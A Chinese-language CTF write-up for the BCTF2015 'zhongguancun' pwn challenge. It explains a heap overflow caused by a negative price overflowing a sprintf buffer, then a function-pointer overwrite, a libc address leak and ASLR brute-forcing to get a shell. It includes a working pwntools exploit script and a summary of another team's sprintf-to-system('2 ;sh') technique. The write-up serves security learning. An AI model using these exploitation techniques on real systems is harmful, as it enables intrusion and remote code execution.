---
layout: post
title: BCTF2015 zhongguancun writeup
catagories: [ctf]
tags: [ctf, writeup, BCTF2015, pwn, exploit]
---

> 堆溢出

```
*********************************
*** Welcome to Zhong Guan Cun ***
*********************************
Are you dreaming of becoming a Milli$_$naire?
Come to sell some electronics!

a) Register my store
b) Try my store
c) Exit
Your choice? 
```

经分析，这个题目是说一个中关村买卖电子产品的服务。在买前之前，需要先在商店里，填好商品条目。一共有两大类，手机和手表，每个条目的数据结构如下：

```
+0x0
callback function, 在增加条目时，被指向一个用来计算批发价的函数。
+0x4
手机或手表名称，由用户自己输入， 长度0x20
+0x24
相关描述，长度0x50
+0x74
价格，长度16
+0x78
操作系统对应选项，其中手机有5个，手表有4个。
```

每个条目的0x7c大小的数据结构，均在堆上申请分配

`0x08049036`处的这个函数，可以打印出目前商店中的商品。它在堆上申请了一个2840大小的空间，然后使用一个函数将其格式化打印到一个指定的buffer里。

```c
int __cdecl sub_804932E(item *a1, char *buffer)
{
    return sprintf(
               buffer,
               "%s %s price: %d CNY description: %s",
               20 * a1->type + 0x804B140,
               a1->name,
               a1->price,
               a1->description);
}
```

那么，到目前为止，可能的漏洞在哪里呢，我们对堆上分配的内存比较敏感，先看看2840大小的空间够不够存放最多16个条目的。
我们把所有的条目都定位到最长，操作系统类型，选择手机里的`Blackberry OS`，即类型为4。其名称输入最长的`31`个字符，描述输入`79`个字符。价格在内存中使用32位整型保存，最大应该是`2147483647`，`%d`打印出来，是10个字符长。

所有的这些加起来，输满16个，好像才2837个字符，没有溢出的样子。

真的是这样吗？价格由atoi()函数转换而成，好像没有做强制类型转换，也就是说可以是负数，如果是负数，像这样`-1000000000`岂不是11个字符，`2837+16>2840`，这样就可以溢出了。

这个溢出，我们如何来利用呢？首先想到的是每个商品也是在堆上分配的（0x7c大小），而每个商品的最开始的地方，是相应的函数指针，能不能把这个函数指针改掉？当然可以，那么改成什么呢？试遍所有，在调函数之前有个判断，从`/dev/zero`里读0, 填充到当前指向的值最末位，即如果是0xaabbccdd，会改成0xaabbcc00，当然，如果这个数据是只读的，就没法改动。那么这个地方的函数指针也只能改成rodata这种只读权限的段的内容了。又因为它是函数指针，我们接下来，也要利用这个函数指针，所以我的方法是改成`008049B64x`，利用其`sub_804932E`函数来向指定内存中打印字符串，这样来达到任意地址写的目的。

如此，在执行到以下代码时，就能执行我们改成的`sub_804932e`处的函数，而第二参数，本来是指购买数量，换成这个函数变成了指定的buffer的值了。也是我们可以控制的。

```c
    read_zero(v4, (void **)&a1->callback);
    v6 = (*(int (__cdecl **)(item *, int))a1->callback)(a1, numberofBuy);
    sprintf(nptr, "The lowest price we can offer is %d CNY.\n", v6);
```

到这里，问题来了，我们能任意地址写了，虽然是一写一大块。我们如何泄露某个libc函数地址，来计算libc基址，并且把计算好的system()函数的地址再写回远端呢？好像比较困难，我们可以使用2840大小的堆地址，将其写成某个libc函数的got表地址，然后很多地方调用了它，可以将它的值打印出来，即应got表的值可以打印出来，但好像一直没找到办法把计算好的system()函数的地址写回去。

我这里的利用不太好，最终还是使用的暴力的思路，泄露出system()地址后，因为它们是页对齐的，即对方alsr无论地址如何变，最后12位是不会变的。并且前面的8位也不会变，变的只是中间那几位，这样变化空间就比较小，可以将一个对的system()函数的地址放上去，然后`while True:`的来调利用脚本，一旦利用成功，因为开了交互式`io.interactive()`,脚本就会停下来，拿到shell。

泄露libc地址的脚本

```python
#!/usr/bin/env python2
from pwn import *

io = process("./zhongguancun-47a25f85cc5221071886cc129046e6e4_noped")
#io = remote("146.148.60.107", 6666)
#bin = ELF("./zhongguancun-47a25f85cc5221071886cc129046e6e4")
#libc = ELF("libc.so.6")
libc = ELF("libc.so.6.local")


buffer = "a"*15 + "\n" + "A"*63 + "\n" 
buffer += ("a"*15 + "\n" + "P"*31 + "\n" + "4" + "\n" + "-1000000000\n" + "D"*79 + "\n") * 15
io.send(buffer)
#raw_input()
buffer = "c" + "\n"
buffer += "a"*15 + "\n" + "P"*31 + "\n" + "4" + "\n" + "-1000000000\n" 
buffer += p32(0x080489C3) + "D"*2 + p32(0x0804B024)*10 + p32(0xf7470da0) + p32(0x080489C3)*4 + p32(0x804b140) + p32(0x0804B030)  + p32(0x08049B64) + "\n"

buffer += "c" + "\n" + "d" + "\n" +"b" +"\n" + "16" +"\n"
buffer += "b" + "\n" + "134525187" + "\n" # offset read, global_s
buffer += "b" + "\n" + "134525696" + "\n"
buffer += "c" + "\n" 
io.send(buffer)


buffer = "b" + "\n"
io.send(buffer)
all = io.recvrepeat(timeout=1)
readaddr = all[-68:-64]
alarmaddr = all[-64:-60]
print libc.symbols["read"]
print libc.symbols["system"]
libcbase = u32(readaddr) - libc.symbols["read"]
systemaddr = libcbase + libc.symbols["system"]
print "[+] leak read() address: ", hex(u32(readaddr))
print "[+] leak libc base address: ", hex(libcbase)
print "[+] leak system() address: ", hex(systemaddr)

io.interactive()
```

然后，再利用上面脚本，稍做修改，将泄露出来的地址硬写进去，加个while的循环，暴力的等shell吧。还是是32位的二进制程序，如果是64位的，这个方法是行不通的。

下面我们来看看别的队伍的比较完美的利用吧。

* <https://gist.github.com/Idolf/99ffa3c5f76165f77b19>

他利用了当前拥有的钱数，将其指向的地址改成`sprintf`的got表的地址，然后在下面这地方，有对钱数进行了改动。

```c
get_input(nptr, 15, '\n');
v1 = atoi(nptr);
if ( v1 <= 0 )
    goto LABEL_6;
v2 = *(_DWORD *)mymoney - a1->price * v1;
if ( v2 >= 0 )
{
    *(_DWORD *)mymoney = v2;
    put_char((int *)"Thanks for buying.\n");
    sprintf(nptr, "Total money left: %d CNY.\n", *(_DWORD *)mymoney);
```

利用钱数改动的操作，将`sprintf`到`system()`的偏移计算好，接下来，执行到`sprintf()`就相当于执行`system("2 ;sh")`了，`nptr="2 ;sh"`
